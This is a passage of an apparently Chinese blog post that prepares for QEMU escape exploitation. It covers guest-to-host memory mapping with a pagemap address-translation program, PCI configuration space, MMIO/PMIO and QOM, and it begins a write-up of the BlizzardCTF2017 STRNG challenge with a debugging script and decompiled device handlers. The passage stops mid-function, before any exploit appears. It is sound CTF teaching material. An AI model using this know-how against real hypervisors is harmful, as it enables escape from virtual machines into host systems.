</span></span><span class=line><span class=cl>                    \__                                        \__
</span></span><span class=line><span class=cl>                       \                                          \
</span></span><span class=line><span class=cl>                        |             QEMU process                 |
</span></span><span class=line><span class=cl>                   +----+------------------------------------------+
</span></span><span class=line><span class=cl>Virtual addr space |    |                                          |
</span></span><span class=line><span class=cl>                   +----+------------------------------------------+
</span></span><span class=line><span class=cl>                   |                                               |
</span></span><span class=line><span class=cl>                    \__                Page Table                   \__
</span></span><span class=line><span class=cl>                       \                                               \
</span></span><span class=line><span class=cl>                        |                                               |
</span></span><span class=line><span class=cl>                   +----+-----------------------------------------------++
</span></span><span class=line><span class=cl>Physical memory    |    |                                               ||
</span></span><span class=line><span class=cl>                   +----+-----------------------------------------------++
</span></span></code></pre></td></tr></table></div></div><p>qemu虚拟机进程会使用mmap分配出对应大小的内存空间，作为虚拟机的物理内存。</p><p>以STRNG启动命令为例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>./qemu-system-x86_64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -m 1G <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -device strng <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -hda my-disk.img <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -hdb my-seed.img <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -nographic <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -L pc-bios/ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -device e1000,netdev<span class=o>=</span>net0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -netdev user,id<span class=o>=</span>net0,hostfwd<span class=o>=</span>tcp::5555-:22
</span></span></code></pre></td></tr></table></div></div><p>其使用-m参数指定虚拟机内存大小为1G，启动虚拟机后查看其maps。(sudo gdb, 然后attach pid)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>0x7fe71ab00000     0x7fe71ac00000 rw-p   <span class=m>100000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe71ac00000     0x7fe71bc00000 rw-p  <span class=m>1000000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe71bc00000     0x7fe71bc01000 ---p     <span class=m>1000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe71bcff000     0x7fe71bd00000 ---p     <span class=m>1000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe71bd00000     0x7fe71be00000 rw-p   <span class=m>100000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe71be00000     0x7fe75be00000 rw-p <span class=m>40000000</span> <span class=m>0</span>    <span class=c1># mmap  </span>
</span></span><span class=line><span class=cl>0x7fe75be00000     0x7fe75be01000 ---p     <span class=m>1000</span> <span class=m>0</span>      
</span></span><span class=line><span class=cl>0x7fe75beff000     0x7fe75bf00000 ---p     <span class=m>1000</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>如何在qemu进程中找到虚拟机中分配的内存呢？</p><p>首先将qemu虚拟机中的虚拟地址转化为物理地址，这个物理地址就是mmap空间的偏移，使用mmap基址加上这个偏移，就是对应的qemu进程空间地址中地址。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;inttypes.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PAGE_SHIFT  12
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)
</span></span></span><span class=line><span class=cl><span class=cp>#define PFN_PRESENT (1ull &lt;&lt; 63)
</span></span></span><span class=line><span class=cl><span class=cp>#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>page_offset</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>addr</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    /proc/pid/pagemap
</span></span></span><span class=line><span class=cl><span class=cm>    * Bits 0-54  page frame number (PFN) if present
</span></span></span><span class=line><span class=cl><span class=cm>    * Bits 0-4   swap type if swapped
</span></span></span><span class=line><span class=cl><span class=cm>    * Bits 5-54  swap offset if swapped
</span></span></span><span class=line><span class=cl><span class=cm>    * Bit  55    pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
</span></span></span><span class=line><span class=cl><span class=cm>    * Bit  56    page exclusively mapped (since 4.2)
</span></span></span><span class=line><span class=cl><span class=cm>    * Bits 57-60 zero
</span></span></span><span class=line><span class=cl><span class=cm>    * Bit  61    page is file-page or shared-anon (since 3.5)
</span></span></span><span class=line><span class=cl><span class=cm>    * Bit  62    page swapped
</span></span></span><span class=line><span class=cl><span class=cm>    * Bit  63    page present
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>gva_to_gfn</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>pme</span><span class=p>,</span> <span class=n>gfn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uintptr_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pme</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>        <span class=c1>// page frame num，指的是右移12位后的页号
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PFN_PRESENT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>gfn</span> <span class=o>=</span> <span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PFN_PFN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>gfn</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>gfn</span> <span class=o>=</span> <span class=nf>gva_to_gfn</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>(</span><span class=n>gfn</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>gfn</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>|</span> <span class=nf>page_offset</span><span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>ptr_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>ptr</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=s>&#34;Where am I?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>ptr_mem</span> <span class=o>=</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Your physical address is at 0x%&#34;</span><span class=n>PRIx64</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr_mem</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pci>PCI<a hidden class=anchor aria-hidden=true href=#pci>#</a></h2><p>PCI是Peripheral Component Interconnect（外围设备互联）的简称，是普遍使用在桌面及更大型的计算机上的外设总线。PCI架构被设计为ISA标准的替代品，它有三个主要目标：获得在计算机和外设之间传输数据时更好的性能；尽可能的平台无关；简化往系统中添加和 删除外设的工作。</p><p>PCI是一种外设总线规范。我们先来看一下什么是总线：总线是一种传输信号的路径或信道。典型情况是，总线是连接于一个或多个导体的电气连线，总线上连接的所有设备可在同一时间收到所有的传输内容。总线由电气接口和编程接口组成。</p><p>PCI总线主要有三部分：</p><ol><li>PCI 设备。符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。</li><li>PCI 总线。PCI 总线在系统中可以有多条，类似于树状结构进行扩展，每条 PCI 总线都可以连接多个 PCI 设备/桥。</li><li>PCI桥。当一条 PCI 总线的承载量不够时，可以用新的 PCI 总线进行扩展，而 PCI 桥则是连接 PCI 总线之间的纽带。</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ lspci
</span></span><span class=line><span class=cl>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC <span class=o>[</span>Natoma<span class=o>]</span> <span class=o>(</span>rev 02<span class=o>)</span>
</span></span><span class=line><span class=cl>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA <span class=o>[</span>Natoma/Triton II<span class=o>]</span>
</span></span><span class=line><span class=cl>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE <span class=o>[</span>Natoma/Triton II<span class=o>]</span>
</span></span><span class=line><span class=cl>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI <span class=o>(</span>rev 03<span class=o>)</span>
</span></span><span class=line><span class=cl>00:02.0 VGA compatible controller: Device 1234:1111 <span class=o>(</span>rev 02<span class=o>)</span>
</span></span><span class=line><span class=cl>00:03.0 Unclassified device <span class=o>[</span>00ff<span class=o>]</span>: Device 1234:11e9 <span class=o>(</span>rev 10<span class=o>)</span>
</span></span><span class=line><span class=cl>00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller <span class=o>(</span>rev 03<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=pci寻址>PCI寻址<a hidden class=anchor aria-hidden=true href=#pci寻址>#</a></h3><p>直接来看一个具体的列子。<code>/proc/iomem</code>描述了系统内所有的设备在地址空间中的映射。(/proc/ioports描述了设备端口的映射)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ lspci
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>00:03.0 Unclassified device <span class=o>[</span>00ff<span class=o>]</span>: Device 1234:11e9 <span class=o>(</span>rev 10<span class=o>)</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>$ cat /proc/iomem
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>febf1000-febf10ff : 0000:00:03.0
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>这是一个PCI设备，febf1000-febf10ff是它所映射的内存地址空间，占据了256bytes，0000:00:03.0则是这个PCI外设的地址，以冒号和点号分割成4部分，第一步16位表示域，第二个8位表示一个总线编号，第三个5位表示一个设备号，最后3位，表示功能号。</p><p>PCI规范允许单个系统最多拥有256条总线，所以总线编号为8位。但对于大型系统来说，这是不够的，所以引入了域的概念，每个PCI域最多拥有256条总线，每条总线最多拥有32个设备，所以为5位，而每个设备最多可有8中功能，所以为3位。</p><p>对于普通PC而言，一般只有一个域。</p><h3 id=pci设备配置空间>PCI设备配置空间<a hidden class=anchor aria-hidden=true href=#pci设备配置空间>#</a></h3><p>PCI设备都有一个配置空间(PCI Configuration Space)，记录了该设备的详细信息。大小为256字节，其中前64字节是PCI标准规定的，并非所有字段必须填写，没用到的可以填充0。</p><p><img alt=Pci-config-space loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgPci-config-space.png></p><p>其中的关键是BAR(Base Address Register)字段，记录了设备所需的地址空间及类型等属性。</p><p>Memory Space BAR Layout</p><table><thead><tr><th>31 - 4</th><th>3</th><th>2 - 1</th><th>0</th></tr></thead><tbody><tr><td>16-Byte Aligned Base Address</td><td>Prefetchable</td><td>Type</td><td>Always 0</td></tr></tbody></table><p>I/O Space BAR Layout</p><table><thead><tr><th>31 - 2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>4-Byte Aligned Base Address</td><td>Reserved</td><td>Always 1</td></tr></tbody></table><p>地址空间的类型包括Memory Space和I/O Space。使用BAR的最低bit区分。</p><p><strong>Memory Space</strong>，最低bit始终为0。type字段为0x00表示使用32bit地址，0x02表示使用64bit地址（64bit的BAR使用两个空间存储基址），0x01为PCI规范修订版3保留，早先版本使用bit1来支持低于1MB的地址空间。Prefetchable字段表示是否可以预取。</p><p>BAR基址的计算：</p><p>16bit&mdash;-BAR[x] & 0xFFF0；</p><p>32bit&mdash;-BAR[x] & 0xFFFFFFF0；</p><p>64bit&mdash;-(BAR[x] & 0xFFFFFFF0) + ((BAR[x+1] & 0xFFFFFFFF) &#171; 32)</p><p><strong>I/O Space</strong>，最低bit为1，一般不支持预取。</p><p>通过Memory Space访问设备I/O称为Memory-Mapped I/O(MMIO)，CPU直接使用普通的访存指令即可进行I/O。</p><p>通过I/O Space访问设备I/O称为Port I/O或者Port-Mapped I/O(PMIO)，这种情况下CPU使用专门的I/O指令（如<code>IN/OUT</code>）访问I/O端口。</p><p>可以通过查看<code>resource</code>文件，获得其MMIO和PMIO的地址/端口等信息。同一文件夹下面还有resource0和resource1文件，resource0对应mmio空间，resource1对应pmio空间。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span>00<span class=se>\:</span>03.0/resource
</span></span><span class=line><span class=cl>0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
</span></span><span class=line><span class=cl>0x000000000000c050 0x000000000000c057 0x0000000000040101
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span></code></pre></td></tr></table></div></div><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p><p>更多关于PCI的说明可以看这篇文章https://zhuanlan.zhihu.com/p/26244141</p><h2 id=qom>QOM<a hidden class=anchor aria-hidden=true href=#qom>#</a></h2><blockquote><p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。</p><p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p></blockquote><p>对于这块的理解，直接读两个简单的例子比较方便。<a href=https://web.archive.org/web/20160413190044/http://ilevex.eu/post/88944209761/how-to-create-a-custom-pci-device-in-qemu>例子1</a> <a href=http://tic-le-polard.blogspot.com/2015/01/emulate-pci-device-with-qemu.html>例子2</a></p><p>进一步可以读读这两篇文章（不太必要，看完我依旧云里雾里的。。）<a href=https://www.binss.me/blog/qemu-note-of-qemu-object-model/>文章一</a> <a href=https://juniorprincewang.github.io/2018/07/23/qemu%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87/>文章二</a></p><h2 id=blizzardctf2017-strng>BlizzardCTF2017-STRNG<a hidden class=anchor aria-hidden=true href=#blizzardctf2017-strng>#</a></h2><p>题目在<a href=https://github.com/rcvalle/blizzardctf2017>repository</a>的release中可以下载到</p><h3 id=debugging>Debugging<a hidden class=anchor aria-hidden=true href=#debugging>#</a></h3><p>使用gdbscript</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cat gdbscript
</span></span><span class=line><span class=cl>aslr off
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>b strng_instance_init
</span></span><span class=line><span class=cl>b strng_pmio_read
</span></span><span class=line><span class=cl>b strng_pmio_write
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev<span class=o>=</span>net0 -netdev user,id<span class=o>=</span>net0,hostfwd<span class=o>=</span>tcp::5555-:22
</span></span><span class=line><span class=cl>$ gdb -q qemu-system-x86_64
</span></span><span class=line><span class=cl>gdb&gt; <span class=nb>source</span> gdbscript
</span></span></code></pre></td></tr></table></div></div><h3 id=mmio>MMIO<a hidden class=anchor aria-hidden=true href=#mmio>#</a></h3><h4 id=strng_mmio_read>strng_mmio_read<a hidden class=anchor aria-hidden=true href=#strng_mmio_read>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>strng_mmio_read</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>只能读4个字节且"地址"必须4字节对齐，将地址转换成index读取数据。</p><h4 id=strng_mmio_write>strng_mmio_write<a hidden class=anchor aria-hidden=true href=#strng_mmio_write>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>strng_mmio_write</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>hwaddr</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rsi
